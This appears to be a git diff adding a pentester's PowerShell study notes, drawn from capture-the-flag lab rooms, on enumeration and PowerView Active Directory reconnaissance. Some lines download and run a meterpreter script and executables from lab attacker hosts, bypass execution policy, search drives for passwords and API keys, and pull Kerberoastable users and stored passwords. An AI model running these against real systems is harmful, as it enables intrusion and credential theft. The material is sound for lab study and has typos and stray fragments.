@@ -1,7 +1,1158 @@
 
 #Important commands in future goal
+# windows credential 
+
+### What is Powershell ? How it Works 
+
+### Windows Enumeration with powershell 
+
+### powershell scripting 
+
+   Powershell is the Windows Scripting Language and shell environment that is built using the .NET framework.
+   
+  This also allows Powershell to execute .NET functions directly from its shell. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets are objects - making Powershell somewhat object oriented. This also means that running cmdlets allows you to perform actions on the output object(which makes it convenient to pass output from one cmdlet to another). The normal format of a cmdlet is represented using Verb-Noun; for example the cmdlet to list commands is called Get-Command.
+Common verbs to use include:
+• Get
+• Start
+• Stop 
+• Read
+• Write
+• New
+• Out
+
+To get the full list of approved verbs, visit this link.
+
+
+	# Basic Powershell Command 
+
+
+	Now that we've understood how cmdlets works - let's explore how to use them! The main thing to remember here is that Get-Command and Get-Help are your best friends! 
+	Using Get-Help
+	Get-Help displays information about a cmdlet. To get help about a particular command, run the following:
+	Get-Help Command-Name
+	You can also understand how exactly to use the command by passing in the -examples flag. This would return output like the following: 
+	
+
+	Using Get-Command
+	Get-Command gets all the cmdlets installed on the current Computer. The great thing about this cmdlet is that it allows for pattern matching like the following
+	Get-Command Verb-* or Get-Command *-Noun
+	Running Get-Command New-* to view all the cmdlets for the verb new displays the following: 
+	
+	Object Manipulation
+	In the previous task, we saw how the output of every cmdlet is an object. If we want to actually manipulate the output, we need to figure out a few things:
+	• passing output to other cmdlets
+	• using specific object cmdlets to extract information
+
+	The Pipeline(|) is used to pass output from one cmdlet to another. A major difference compared to other shells is that instead of passing text or string to the command after the pipe, powershell passes an object to the next cmdlet. Like every object in object oriented frameworks, an object will contain methods and properties. You can think of methods as functions that can be applied to output from the cmdlet and you can think of properties as variables in the output from a cmdlet. To view these details, pass the output of a cmdlet to the Get-Member cmdlet
+	Verb-Noun | Get-Member 
+	An example of running this to view the members for Get-Command is:
+	Get-Command | Get-Member -MemberType Method
+	
+	From the above flag in the command, you can see that you can also select between methods and properties.
+	Creating Objects From Previous cmdlets
+	One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the Select-Object cmdlet. 
+	Here's an example of listing the directories and just selecting the mode and the name:
+	
+	You can also use the following flags to select particular information:
+	◇ first - gets the first x object
+	◇ last - gets the last x object
+	◇ unique - shows the unique objects
+	◇ skip - skips x objects
+
+	Filtering Objects
+	When retrieving output objects, you may want to select objects that match a very specific value. You can do this using the Where-Object to filter based on the value of properties. 
+	The general format of the using this cmdlet is 
+	Verb-Noun | Where-Object -Property PropertyName -operator Value
+	Verb-Noun | Where-Object {$_.PropertyName -operator Value}
+	The second version uses the $_ operator to iterate through every object passed to the Where-Object cmdlet.
+	Powershell is quite sensitive so make sure you don't put quotes around the command!
+	Where -operator is a list of the following operators:
+	◇ -Contains: if any item in the property value is an exact match for the specified value
+	◇ -EQ: if the property value is the same as the specified value
+	◇ -GT: if the property value is greater than the specified value
+
+	For a full list of operators, use this link.
+	Here's an example of checking the stopped processes:
+	
+	Sort Object
+	When a cmdlet outputs a lot of information, you may need to sort it to extract the information more efficiently. You do this by pipe lining the output of a cmdlet to the Sort-Object cmdlet.
+	The format of the command would be
+	Verb-Noun | Sort-Object
+	Here's an example of sort the list of directories:
+	
+	Now that you've understood the basics of how Powershell works, let try some commands to apply this knowledge!
+
+
+################  example 
+
+get-command | get-member  -membertype method -name equals # filter the command 
+
+get-membert is best command for filter output 
+
+##### best command 
+
+select-object is used to text 
+
+get-process | select-object -property name
+
+get-process | select-object -property processname,handles # filter process 
+
+
+#  How to count all cmdlet install on windows powershell 
+
+get-command | where-object -property commandtype -eq Cmdlet | measure
+
+# measure is used for count number 
+
+# get all file 
+
+get-childitem -path C:\ -recurse 
+
+# find specfic file inside powershell
+
+#  Get-ChildItem -Path C:\ -Recurse -Filter "*interesting-file.txt*" -ErrorAction SilentlyContinue
+
+# -filter option help to find specific file 
+
+# find current working directory # you can use pwd or get-location 
+
+
+### Enumeration ########## 
+
+The first step when you have gained initial access to any machine would be to enumerate. We'll be enumerating the following:
+• users
+• basic networking information
+• file permissions
+• registry permissions
+• scheduled and running tasks
+• insecure files
+
+Your task will be to answer the following questions to enumerate the machine using Powershell commands! 
+
+
+# Find all user in powershell 
+
+ get-localuser    #all user 
+ get-localgroup  # all group 
+ 
+ # find sid value in powershell 
+ 
+ 
+Get-LocalUser guest | Select-Object sid
+
+# find ip address in powershell 
+
+ get-netipaddress
+ 
+ # find listing port in powershell 
+ 
+Get-NetTCPConnection
+
+# count listing port in powershell 
+
+ 
+ Get-NetTCPConnection | Where-Object -Property state -eq Listen | Select-Object -Property State | measure
+ 
+ 
+ ########### powershell command working on linux 
+ 
+  Get-ChildItem -Path /home/pentestblog/ -Recurse -Filter "Metasploit.txt" -ErrorAction SilentlyContinue
+
+
+#   count all cmdlet in linux 
+
+ Get-Command | Where-Object -Property CommandType -eq Cmdlet | measure
+
+
+# fetch all sid value 
+
+get-localuser | select-object sid | where-object -property sid -eq “sdivalue”
+
+
+
+# How to grep or select particular word in file 
+
+ Get-NetIPAddress | Select-Object "IPAddress"
+ 
+ 
+ # open your mind with secret 
+ 
+ if you want  to know only networking command then you can put get-net* this will show all networking related command 
+ 
+  examples: 
+    
+      show ipaddress 
+      
+        get-netipaddress 
+        
+       show listing port 
+       
+       get-nettcplisting 
+     
+     
+   # show all process in windows 
+   
+    get-process 
+    
+     # to process in windows 
+     
+      stop-process pid 
+      
+     # show patch in windows 
+     
+      systeminfo >  file.txt 
+      
+      # Finding all backup file in windows 
+      
+       Get-ChildItem -path  C:\ -Recurse -Include "*.bak*"  -ErrorAction 
+       
+       SilentlyContinue 
+       
+       # you can use -Include 
+       
+       ### you can use without using any property 
+       
+       
+   get-process |Where-Object ProcessName  -eq "svchost" | Select-Object WS
+   
+   
+## how many cmdlet install on target system 
+
+ Get-Command | Where-Object CommandType -eq cmdlet | measure
+ 
+ ## Choose specific sid item 
+ 
+ 
+ Get-LocalUser | select-object sid | Where-Object SID -eq "S-1-5-21-1394777289-3961777894-1791813945-501" # you can choose specific item 
+ 
+ # open you mind all networking related issue you can use get-net*  command 
+ 
+ get-command get-net* # see all command related networking 
+ 
+ 
+ # you can using following to hotfix 
+ # to see how to many how hotfixes apply 
+ 
+ get-hotfix
+ 
+ 
+ # find sid value exact 
+ 
+  get-localuser | select-object -Property Name,Sid
+  
+  # Find specific Hotfix install date 
+  
+   Get-HotFix  | Where-Object -Property HotFixID -eq "KB4023834"
+   
+   # Find the BAckup file 
+   
+   Get-ChildItem -path C:\ -Recurse -Filter *bak*
+   
+   # what command is used to seee running process 
+   
+   get-command 
+   
+   # How to find specific api_key in all file 
+   
+    Get-ChildItem -path C:\ -Recurse |Select-String -pattern API_KEY | measure
+    
+    # Find Schedule task 
+    
+     Get-ScheduledTask | Select-String -Pattern "new-sched-task"
+     
+     # check owner of c 
+     
+     get-acl C:
+ 
+ # find only listen port
+ 
+  get-nettcpconnection -state listen 
+  
+  # read all contenet specific folder 
+  
+   Get-ChildItem -path "C:\Users\Administrator\Desktop\emails" -Recurse -Filter *.txt | Get-Content
+   
+   # search specific folder find specific word 
+   
+   get-childitem  -path "C:\Users\Administrator\Desktop\emails" -Recurse -Filter *.txt | Get-Content | Select-String -Pattern "password"
+   
+   # best command for powershell match with path and test contetn 
+    
+   
+    Get-ChildItem -path "C:\Users\Administrator\Desktop\emails\" -Recurse| Select-String "password
+    
+    
+    ########################################################### 
+    
+    ############################# Powershell For Pentester ##############################
+		
+		Whether you have direct shell access and try to live off the land or use a command control infrastructure such as Covenant, PowerShell is a powerful tool to master. This section will cover the basics of PowerShell that will be useful in any engagement. If you do not feel comfortable using PowerShell, please consider revisiting the “Hacking with PowerShell” room.
+
+
+	As you have probably noticed, most of the command-line portions of penetration test training focus on using Linux. However, most systems used within a corporate environment are Windows; thus, it is important that the Red Team member feels at home in both operating systems.
+
+
+	There are several PowerShell scripts useful in penetration tests, such as PowerView and Nishang; however, please remember these two points about them;
+	1) They are detected by most antivirus software
+	2) They are detected by most antivirus software
+
+
+	Below is a simple test run with the free version of AVG antivirus. As you can see, the “Get-ComputerDetails.ps1” script, which is part of PowerSploit, has been detected.
+
+
+	
+
+
+
+
+
+
+
+	So, if you dream of connecting to a target machine on a corporate network and instantly being able to fire up PowerSploit or Nishang, this might not always be the case. There will, of course, be situations where these scripts will run and be very useful, but do not take them for granted.
+
+
+	On the other hand, being able to use PowerShell will give you the power of an object-oriented programming language readily available on the target platform.
+
+
+	Before moving forward, take time to complete the “Hacking with Powershell” room.
+
+
+	You can connect to the target using SSH with the following credentials:
+	Username: walter
+	Password: Kowacs123!
+	You can then type "powershell" to access PowerShell.
+
+
+
+	Is this realistic?
+	This user simulates you, an attacker, having shell access to the target. As you know, this may be achieved by exploiting an existing vulnerability or through a command injection vulnerability on a web application.
+
+
+
+# start and stop process 
+
+ get-process  # to see all process running 
+ 
+ start-process is used to start any process 
+ 
+ start-process notepad 
+ 
+ #to see particular process then put 
+ 
+  get-process -name notepad 
+  
+   # to stop process then you can put this command 
+   
+    stop-process pid 
+    
+    # save output using powershell 
+    
+     get-process | export-csv file.ps1
+     
+     # get-content is used to read file just like cat in linux type in windows 
+     
+     # copy-item is used to copy file 
+       
+        copy-item file.ps1 ../
+        
+       # rename item in powershell 
+       
+        move-item pen.ps1 love.ps1 
+        
+        # remove item in powershell 
+        
+         remove-item love.ps1
+         
+         
+         # to get file hash just like linux md5sum 
+         
+         Get-FileHash -Algorithm MD5 .\com.ps1n
+         
+         
+         ################  Manipulating file #####################
+         
+				 
+				 The "Start-Process" command can be used to start a process. You can see an example below for notepad.exe.
+
+
+
+		
+
+
+
+
+
+
+		Get-Process
+
+
+		Get-Process is useful to list all running processes.
+		It can also be used with the “-name” parameter to filter for a specific process name.
+
+
+		
+
+
+		Especially with command outputs that may be difficult to read or need further processing appending the “Export-Csv” command will create a CSV file with the output of the first command.
+
+
+		
+
+
+
+
+		Get-Content
+
+
+		Similar to “cat” on Linux and “type” on the Windows command-line, “Get-Content” can be used to display the content of a file.
+
+
+		
+
+
+
+
+
+
+		Copy-Item
+
+
+		Files can be copied and moved with “Copy-Item” and “Move-Item”, respectively.
+
+
+		
+
+
+
+
+		Get-FileHash
+
+
+		Although not directly related to penetration tests, hashes are handy to compare files or search for malware samples on platforms such as VirusTotal. The built-in “Get-FileHash” command can be used to obtain hashes on most formats.
+
+
+		
+
+
+################ Downloading file #################### 
+
+
+	There are numerous ways to download files from a remote server using PowerShell. One of the quickest ways can be seen below. This will connect to the remote host (10.0.2.8 in this case) and download themeterpreter-64.ps1. The file is saved as “meterpreter.ps1”.
+
+
+	The screenshot below shows a sample lab setup used with Kali running a Python HTTP server on port 8888 (python3 -m http.server 8888).
+
+
+
+	
+
+
+
+	Once the script has been downloaded, you may run into the first related to PowerShell: ExecutionPolicy. It is important to note that, as Microsoft clearly states in the related documentation, “ExecutionPolicy” is NOT a security feature. It merely functions as an added safety measure and can be bypassed by the user.
+
+
+	
+
+
+
+
+
+	The current state of the ExecutionPolicy configuration can be seen using “Get-ExecutionPolicy -list”
+
+
+	Execution policies can have seven different values;
+
+
+	1. AllSigned: Scripts can run but require all scripts to be signed by a trusted publisher.
+	2. Bypass: All scripts can run, and no warnings or prompts will be displayed.
+	3. Default: This refers to “restricted” for Windows clients and “RemoteSigned” for Windows servers.
+	4. RemoteSigned: Scripts can run, and this does not require local scripts to be digitally signed.
+	5. Restricted: The default configuration for Windows clients. Allows individual commands to run, does not allow scripts.
+	6. Undefined: This shows that no specific execution policy was set. This means default execution policies will be enforced.
+	7. Unrestricted: Most scripts will run.
+	As mentioned earlier, ExecutionPolicy is not a security feature and can be bypassed by users. The user has several alternatives to bypass the ExecutionPolicy; however, some methods may require the user to have administrator account privileges.
+
+
+	The most common way to bypass execution policy can be seen below:
+
+
+	
+
+
+
+
+
+	Another option could be to use “Set-ExecutionPolicy Bypass” with the scope set for the process. The “-scope” parameter will set the execution policy only for the current PowerShell session and will go back to the initial settings once the PowerShell session is closed.
+
+
+	
+
+
+
+
+	Another easy way to download files from a remote server is to use the “Invoke-WebRequest” command.
+
+
+	
+
+
+
+
+# bypass powershell execution policy 
+
+ powershell -ExecutionPolicy Bypass -File meterpreter.ps1 
+ 
+ # bypass powershell execution policy 
+ 
+   Set-ExecutionPolicy Bypass -Scope Process 
+
+
+
+
+##########################  System Reconnaincence #######################
+
+
+	While several PowerShell scripts are readily available for reconnaissance, these may be flagged by the antivirus installed on the target system.
+
+
+	Finding Missing Patches
+
+
+	The patch level of the target system will have an impact on the steps following the initial compromise. Having an idea about the potentially missing patches could help the red teamer identify a possible privilege escalation path or even provide further information about the target system.
+
+
+	The “Get-Hotfix” command can be used to enumerate already installed patches.
+
+	
+
+
+
+
+
+	To make things easier, we could output the result of the Get-Hotfix command in a list format and grep it further using the “findstr” command. The example below shows how the installation date of patches could be listed to have a better idea about update cycles on the target.
+
+
+	
+
+
+
+
+
+	By default, the “Get-HotFix” command will show the output in a table format. This table can be useful to list only data provided in a column without the need to use “findstr” using “Format-Table” followed by the name of the column we are interested in. The example below shows the output listing only HotFixIDs.
+
+
+
+
+	
+
+
+
+
+	“Format-List” can also be used to gather more information about objects. Below are three examples using a simple “dir” command.
+
+
+	
+
+
+
+	
+
+
+
+
+
+	
+
+
+
+	As you can see, we can access even more information about the file (such as the CreationTime, Last AccessTime, LastWriteTime) using a wildcard after “Format-List” to show all available information.
+
+
+
+
+	At any stage, “Out-File” can be used to save the output to a file for further use.
+
+
+	
+
+
+
+
+
+	“Get-Content” could also be used to read the file's content just as “type” shown in the example above. Several other output formats are available, including the beautiful GridView option.
+
+
+
+
+	
+
+
+
+
+	The GridView option provides a nice GUI with sortable columns for any output that can be overwhelming on the CLI.
+
+
+	
+
+
+########### There are two best way download file on target system ######################
+
+
+PS C:\Users\Walter> (New-Object System.Net.WebClient).DownloadFile('http://10.11.1.237/host.txt','host.txt')                          
+PS C:\Users\Walter> Invoke-WebRequest -uri http://10.11.1.237/win1.exe -outfile C:\Users\Walter\win.exe 
+
+# bypass powershell execution policy 
+
+ powershell -ExecutionPolicy Bypass -File win.exe
+
+ or you can use 
+  
+  Set-ExecutionPolicy Bypass -Scopels  Process
+  
+  # selct only specfic part 
+  
+   format-list is good command for powershell 
+    and findstr is used to find string in windows
+    
+     get-process | format-list | findstr Id 
+  
+   # this command is very helpfull 
+   
+   # to see all install hot fixes on windows 
+   
+    get-hotfix | format-list | findstr InstalledOn 
+    
+    
+    or you can use format-table 
+    
+    get-hotfix | format-table Installed #install is property 
+    
+    format-table just working as a select-object -property processname 
+    
+    # too all hidden file in windows 
+    
+     get-childitem | format-list * 
+     
+     # out-file is used to saved the output in windows 
+     
+      get-childitem | out-file pen.txt 
+      
+      
+      # if you want to see file in gui mode then you can use 
+      
+      get-process | out-gridview # this command will process in gui mode 
+      
+      # find hotfix through date 
+      
+       Get-HotFix| findstr "5/15/2019"
+
+# if you want to see specific row then you can use format-table 
+
+ get-process | format-table | findstr notepad
+ 
+ 
+PS C:\Users\Walter> Get-HotFix| Format-list | findstr "5/15/2019"
+InstalledOn         : 5/15/2019 12:00:00 AM
+PS C:\Users\Walter> Get-HotFix| Format-Table | findstr "5/15/2019"
+WATCHMAN-DC   Security Update  KB4499728     NT AUTHORITY\SYSTEM  5/15/2019 12:00:00 AM    
+PS C:\Users\Walter>
+ 0:sudo#-   1:ss
+ 
+  # different between table and list 
+  
+   table show whole row but list is not show whole 
+   
+   # network scan from given ranges 
+
+   
+   #########################  Network Reconnainse #######################
+	   
+	   The following command can be used to ping a given IP range. In this example, we will ping the IP addresses from 10.0.2.1 to 10.0.2.15
+
+	
+
+	The first part of the command, delimited by the "|" character, sets the range for the last octet. The second part generates and prints the IP address to be used and pipes it to the command line. Finally, the last part greps lines that include the âTTLâ string.
+
+
+	A similar command can be built using the existing socket and TCP client functions. In the example below, we scan the first 1024 TCP ports of the target. Note that the â2>$nullâ sends any error to null, providing us with a cleaner output.
+
+	
+
+
+
+############## Powerview#################################
+
+	PowerView is one of the most effective ways to gather information on the domain. The module can be downloaded from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+
+
+	Remember that you may need to bypass the execution policy to be able to run the script.
+
+
+	
+
+
+
+
+
+	We can now use PowerView.ps1 to obtain more information on the domain configuration and users.
+
+
+
+
+	Get-NetDomainController
+
+
+	This command will collect information on the domain controller.
+
+
+
+	
+
+
+
+	Knowing the IP address of the domain controller will be useful to conduct man-in-the-middle attacks and to focus our efforts on high-value targets.
+
+
+	Get-NetUser
+
+
+	This command will provide a list of domain users. The output can be intimidating, so you may consider exporting the output to a .csv file or use the out-gridviewoption.
+
+
+	
+
+
+
+
+	The output can also be limited by providing the name of the criteria we are interested in.
+
+
+	
+
+
+
+
+
+
+
+	Values for a specific property can be listed. For example, if we wanted to list users' last logon dates and times we could use the "Get-NetUser | select -ExpandProperty lastlogon" command.
+
+
+
+
+
+	
+
+
+
+
+
+	The same command can be modified to select the "description" field instead of "lastlogon" to see if any description was added to accounts.
+
+
+
+
+
+	Get-NetComputer
+
+
+	This command is useful to enumerate systems connected to the domain. This command can also be used with the “-ping” parameter to enumerate the systems that are currently online.
+
+
+	
+
+
+
+
+
+
+	As you can see in the screenshot above, there are four systems on the domain, but only two of them are online.
+
+
+	Get-NetGroup
+
+
+	Some accounts can be members of important groups, such as domain admins. Knowing which accounts have useful privileges or are a member of groups of interest will be useful for lateral movement and privilege escalation. The “Get-NetGroup” command will help us enumerate existing groups.
+
+
+	
+
+
+
+
+
+	This will be used to enumerate members of the group using “Get-NetGroupMember” followed by "Domain Admins".
+
+
+	
+
+
+
+
+
+
+
+	Finding shares
+
+
+
+	“Find-DomainShare” will list available shares. Please note we have added the "-CheckShareAccess" option to list only readable shares.
+
+
+
+	
+
+
+
+
+
+	Enumerate Group Policy
+
+
+	Group Policy is used to configure computers connected to the domain. The “Get-NetGPO” command will gather information on enforced policies.
+
+
+	
+
+
+
+
+
+
+	Spending some time understanding what policies are set can provide potential attack vectors (is Windows Defender disabled? Is the firewall disabled? Etc.)
+
+
+	The domain you are testing can have a trust relationship with another domain. If this is the case, you may be able to extend the scope of the reconnaissance to that domain. The “Get-NetDomainTrust” command will list any domain you may access. For most of the PowerView commands, all you need to do is to add the “-Domain” parameter followed by the name of the other domain (e.g. Get-NetUsers -Domain infra.munn.local)
+
+
+	User Enumeration
+
+
+	Knowing which systems the current user can access with local administrator privileges can facilitate lateral movement. The “Find-LocalAdminAccess” command will list systems in the domain you may access as a local administrator.
+
+
+
+	
+
+
+
+
+
+
+	A good source for PowerView usage can be found here.
+
+
+	Get-NetComputer
+	Get-NetDomain
+	Get-NetDomainController
+	Get-NetDomainTrust
+	Get-NetFileServer
+	Get-NetForest
+	Get-NetForestCatalog
+	Get-NetForestDomain
+	Get-NetForestTrust
+	Get-NetGPO
+	Get-NetGPOGroup
+	Get-NetGroup
+	Get-NetGroupMember
+	Get-NetOU
+	Get-NetProcess
+	Get-NetSite
+	Get-NetSubnet
+	Get-NetUser
+
+
+
+
+# show specific word 
+
+Get-NetUser | findstr "accountexpires"
+
+
+
+# Find Specific Sid Value using findstr 
+
+Get-LocalUser| Select-Object -Property sid |findstr "1115"
+
+# wmic is great command in windows 
+
+wmic /? # show all commad 
+
+wmich <command Name> get <property> 
+
+wmich bios get name,product 
+
+# find specific hotfix installed on cureent 
+
+Get-HotFix | Format-Table |findstr "1/13/2021"
+
+
+#open your mind 
+
+without running powerview you can not see domain control ler information 
+
+(Get-NetDomain).DomainControllers # this is method you can access this 
+
+get-netdomain* show all domain command 
+
+
+
+ # this process is called function 
+ 
+ # get-netuser show all user details 
+ # you can see domaincontroller 
+ 
+  Get-NetDomainController
+  
+  # check only user name 
+  
+   get-netuser | findstr samaccountname # is best command 
+   
+   # you can access method 
+   
+    (get-netuser).name # this command is only show username of target system . 
+    
+    
+# you can check last logon password 
+
+ (get-netuser).lastlogon
+
+or you can use this command 
+
+ Get-NetUser | select -ExpandProperty lastlogon
+
+# how to check domain active or not 
+
+ get-netcomputer -ping 
+ 
+ # Every Networking Related command you can put 
+ 
+  get-net* this will help in pentesting feild 
+  
+  # same command 
+  
+   get-netgroup 
+   
+   	# find admin group using get-netgroupmember 
+   
+    Get-NetGroupMember "Domain Admins" 
+    
+    # you can find domain share 
+    
+     Find-DomainShare -CheckShareAccess
+     
+     
+     
+     
+     # find group policy 
+     
+      get-netgpo 
+      
+      # userenumeration 
+      
+       Find-LocalAdminAccess
+       
+       # you can find command 
+       
+       # you can help hacktrick 
+       
+       Get-NetDomain #Basic domain info
+#User info
+Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
+Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
+Get-NetUser -PreauthNotRequired #ASREPRoastable users
+Get-NetUser -SPN #Kerberoastable users
+#Groups info
+Get-NetGroup | select samaccountname, admincount, description
+Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
+#Computers
+Get-NetComputer | select samaccountname, operatingsystem
+Get-NetComputer -Unconstrainusered | select samaccountname #DCs always appear but aren't useful for privesc
+Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
+Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
+#Shares
+Find-DomainShare -CheckShareAccess #Search readable shares
+#Domain trusts
+Get-NetDomainTrust #Get all domain trusts (parent, children and external)
+Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
+#LHF
+#Check if any user passwords are set
+$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
+#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
+Find-LocalAdminAccess
+#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
+Invoke-UserHunter -CheckAccess
+#Find interesting ACLs
+Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
+
+
+# How many accounts are disabled?
+
+  get-netuser | findstr “^account” #  powershell support wildcard 
+  
+# check import credential using 
+cmdkey \list 
+
+# check all hidden file inside in windows any location 
+
+ get-childitem -hidden -path C:
+    
+
+# to see all domain related command 
+
+ get-help *domain* 
+ 
+ 
+ # find only ip address 
+ 
+  get-ipaddress 
+  
+  
+# colloect domain controller 
+
+ Get-NetDomainController
+ 
+ 
+ #  show all user 
+ 
+  get-netuser 
+  
+  # find all user list 
+  
+    (Get-NetUser).name
+
+ here name is a just access class 
+ 
+ # we want to show last logon time and date 
+ 
+  get-netuser  | format-table name,lastlogon 
+  
+  #open you mind 
+  
+   get-netuser | select -property name,lastlogon 
+   
+   # format table and select is same working 
+   
+    findstr is used to search file on computer 
+    
+    or 
+    
+     get-netuser | select -expandproperty lastlogon 
+     
+     # how to check system connected to internet 
+     
+      get-netcomputer -ping 
+
+
+# group name is very important 
+
+ get-netgroup 
+  
+  get-netgroupmember | findstr “Domain Admin”
+  
+  #open your mind this command is useful 
+  
+   Get-NetGroupMember "Domain Admins"
+   
+   #find only domain and admins group member 
+   
+   
+   # to see all share in windows computer 
+   
+    find-domainshare
+    
+    # enumerate group policy 
+    
+    get-netgpo 
+    
+    # check all domain watch.local to connected 
+    
+     get-netuser -Domain watch.local | select name 
+
+
+# know which domain can access current luser 
+ 
+ Find-LocalAdminAccess
+ 
+ 
+ 
+ ##  Question Answer Section 
+ 
+  One of the accounts has a special description; what is it?
+
+  get-netuser | format-table name,description 
+  
+  # How many accounts are disabled?
+ 
+   get-netuser | findstr “accountexpire”
+   
+  
+   get-netuser  |Format-Table accountexpires,name 
+
+# How many users are in the "domain admins" group?
+
+ get-netuser|Format-list   |findstr "Domain Admins"    
+
+
+# Which users are in the "domain admins" group? (Listed alphabetically, small, comma-separated, using space)
+
+Get-NetGroupMember "Domain Admins" 
+
+# List shares; what is the name of the "interesting" share?
+ 
+    find-domainshare
+    
+    #  What is the name of the user-created Group Policy?
+
+      Get-NetGPO |Format-Table usncreated,name,displayname 
+
+# find disable account 
+
+ get-netuser  |select cn,useraccountcontrol
+
+
+
+# How to get whole detail about user 
+
+ get-localuser -Name Walter | select *
+ 
+ # see all user in powershell 
+ 
+    get-localuser -name * | select *  | ft sid
+
+
+
+
+############# 
+
+• users
+• basic networking information
+• file permissions
+• registry permissions
+• scheduled and running tasks
+• insecure files
+
+
+Get-ChildItem | Select-String hot 
+# you can ping range 
+1..15| %{echo "10.11.1.$_"; ping -n 10.11.1.$_|Select-String ttl}
+
+#you can check lastlogon 
+
+get-netuser  | select -ExpandProperty lastlogon
+
+# nslookup command is great command 
+
+ └─$ nslookup 
+> server google.com
+Default server: google.com
+Address: 142.251.42.78#53
+> 
+
+
 
 # Fix erro in ruby metasploit 
+
 #gem missing bundle install 
 
 
